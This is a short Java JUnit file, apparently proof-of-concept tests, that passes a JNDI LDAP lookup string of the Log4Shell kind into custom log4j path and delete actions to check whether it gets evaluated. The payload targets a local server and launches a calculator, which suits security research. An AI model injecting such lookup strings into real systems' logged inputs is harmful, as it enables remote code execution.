import org.actions.CustomDeleteAction;
import org.actions.CustomPathAction;
import org.apache.logging.log4j.core.appender.rolling.action.AbstractPathAction;
import org.apache.logging.log4j.core.appender.rolling.action.PathCondition;
import org.junit.jupiter.api.Test;

import java.io.IOException;
import java.nio.file.FileVisitor;
import java.nio.file.Path;
import java.util.List;


public class ActionPocTests {

    @Test
    public void getBasePathAbstractPathActionTest() {
        AbstractPathAction action = new CustomPathAction("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}");
        try {
            action.getBasePath();
        } catch (Exception e) {
        }
    }

    @Test
    public void toStringAbstractPathActionTest() {
        AbstractPathAction action = new CustomPathAction("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}");
        try {
            action.toString();
        } catch (Exception e) {
        }
    }

    @Test
    public void executeAbstractPathActionTest() {
        AbstractPathAction action = new CustomPathAction("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}");
        try {
            action.execute();
        } catch (Exception e) {
        }
    }

    @Test
    public void executeDeleteActionTest() {
        CustomDeleteAction action = new CustomDeleteAction("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}");
        try {
            action.execute();
        } catch (Exception e) {
        }
    }
}
